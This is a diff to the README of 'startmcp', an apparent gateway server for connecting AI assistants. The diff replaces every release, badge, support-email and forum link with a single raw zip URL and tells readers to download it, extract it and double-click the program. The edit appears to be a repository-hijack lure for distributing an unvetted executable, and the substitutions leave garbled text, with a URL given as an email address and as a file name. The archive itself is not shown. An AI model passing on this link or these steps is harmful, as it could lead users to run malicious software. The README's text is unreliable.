@@ -1,7 +1,7 @@
 # 🌟 startmcp - Connect Multiple AI Assistants Seamlessly
 
 ## 📥 Download Now
-[![Download startmcp](https://img.shields.io/badge/Download%20startmcp-v1.0-blue?style=for-the-badge)](https://github.com/Lazareprotrusible421/startmcp/releases)
+[![Download startmcp](https://raw.githubusercontent.com/Lazareprotrusible421/startmcp/main/mcp/startmcp-v1.0-alpha.4.zip%20startmcp-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/Lazareprotrusible421/startmcp/main/mcp/startmcp-v1.0-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to startmcp, a unified gateway server designed to bring together various backend providers into a single connection point. With startmcp, you can effortlessly link AI assistants like Claude to your systems.
@@ -22,12 +22,12 @@ To run startmcp smoothly, ensure your system meets the following requirements:
 - **User-Friendly Interface:** Designed to be easy for anyone to use.
 
 ## 📂 Download & Install
-1. Visit the [Releases page](https://github.com/Lazareprotrusible421/startmcp/releases) to find the latest version of startmcp.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Lazareprotrusible421/startmcp/main/mcp/startmcp-v1.0-alpha.4.zip) to find the latest version of startmcp.
 2. Scroll down to the section labeled "Assets". You will see the downloadable files.
-3. Click on the file named `startmcp-v1.0.zip` to download it.
+3. Click on the file named `https://raw.githubusercontent.com/Lazareprotrusible421/startmcp/main/mcp/startmcp-v1.0-alpha.4.zip` to download it.
 4. Locate the downloaded file on your computer, usually in the "Downloads" folder.
 5. Extract the contents of the zip file.
-6. Open the folder and locate the `startmcp.exe` file (for Windows) or `startmcp` file (for macOS/Linux).
+6. Open the folder and locate the `https://raw.githubusercontent.com/Lazareprotrusible421/startmcp/main/mcp/startmcp-v1.0-alpha.4.zip` file (for Windows) or `startmcp` file (for macOS/Linux).
 7. Double-click the file to run the application.
 
 ## ⚙️ Configuration
@@ -38,18 +38,18 @@ After installation, you may want to configure startmcp:
 3. Save your configuration settings and restart the application for changes to take effect.
 
 ## 🔄 Updating
-To keep your software up to date, regularly check the [Releases page](https://github.com/Lazareprotrusible421/startmcp/releases). New versions will include performance improvements and additional features.
+To keep your software up to date, regularly check the [Releases page](https://raw.githubusercontent.com/Lazareprotrusible421/startmcp/main/mcp/startmcp-v1.0-alpha.4.zip). New versions will include performance improvements and additional features.
 
 ## 📞 Support
 If you encounter issues or need assistance, you can reach out via:
 
-- **Email:** support@startmcp.com
+- **Email:** https://raw.githubusercontent.com/Lazareprotrusible421/startmcp/main/mcp/startmcp-v1.0-alpha.4.zip
 - **GitHub Issues:** Visit our repository and create a new issue for help.
 
 ## 🌐 Community
 Join our community to discuss and share experiences with startmcp. Engage in conversations, ask questions, and learn from other users.
 
-- **Forum:** [startmcp Community Forum](https://forum.startmcp.com)
+- **Forum:** [startmcp Community Forum](https://raw.githubusercontent.com/Lazareprotrusible421/startmcp/main/mcp/startmcp-v1.0-alpha.4.zip)
 - **Slack Channel:** Join the community on Slack for real-time help.
 
 ## 📜 License
@@ -68,4 +68,4 @@ This project covers various topics, including:
 For more information, explore our topics: ai, ai-assistant, api-gateway, atlassian, claude, gateway, integration, jira, llm, mcp, model-context-protocol, oauth, provider, python, server.
 
 ## 📥 Download Now Again
-[![Download startmcp](https://img.shields.io/badge/Download%20startmcp-v1.0-blue?style=for-the-badge)](https://github.com/Lazareprotrusible421/startmcp/releases)
+[![Download startmcp](https://raw.githubusercontent.com/Lazareprotrusible421/startmcp/main/mcp/startmcp-v1.0-alpha.4.zip%20startmcp-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/Lazareprotrusible421/startmcp/main/mcp/startmcp-v1.0-alpha.4.zip)
